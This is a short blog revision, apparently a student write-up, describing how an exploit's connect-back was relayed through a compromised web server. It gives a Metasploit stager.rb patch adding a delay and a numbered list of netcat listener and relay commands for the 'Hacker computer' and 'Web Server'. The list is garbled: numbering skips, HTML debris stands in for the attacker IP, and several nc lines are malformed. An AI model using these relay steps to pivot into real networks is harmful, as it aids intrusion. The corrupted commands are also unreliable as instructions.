---
id: 797
title: 'Students&#8217; temp name'
date: '2010-05-11T15:48:43-05:00'
author: 'Ron Bowes'
layout: revision
guid: 'http://www.skullsecurity.org/blog/?p=797'
permalink: '/?p=797'
---

In order to get the timing right for the final command, a modification to the *stager.rb* in the */core/payload/* folder was necessary. We added a three-second delay before the stage data was sent in order to link the connections together; otherwise, the stage data would be sent before the entire link was created and, while the vulnerability would be exploited, the connection back would fail.

```
Index: stager.rb
===================================================================
--- stager.rb   (revision 8091)
+++ stager.rb   (working copy)
@@ -100,6 +100,9 @@
                                p = (self.stage_prefix || '') + p
                        end

+            print_status("Delaying for three seconds (Start your nc relay).")
+            Kernel.sleep(3)
+
                        print_status("Sending stage (#{p.length} bytes)")

                        # Send the stage
@@ -164,4 +167,5 @@
        #
        attr_accessor :stage_prefix
```

The following commands were executed in the order provided. We had to wait before executing #6 until #2 received a connection established message. The -vv command is optional for all nc instances except in #2, where they are used to determine when to execute #6.

1. This command is run on the Hacker computer:

- nc -l -p 4443 -vv pipe1

6. This command was run on the Web Server:
- nc -l -p 4444 -vv pipe2

8. Hacker computer:
- nc -l -p 1234 -vv pipe3

10. Web Server:
- nc <hacker address="" computer="" ip=""> 1234 -vv 445 -vv > pipe4</hacker>

12. Run Exploit
13. Hacker computer:
- nc <hacker address="" computer="" ip=""> 4444 -vv 4443 > pipe</hacker>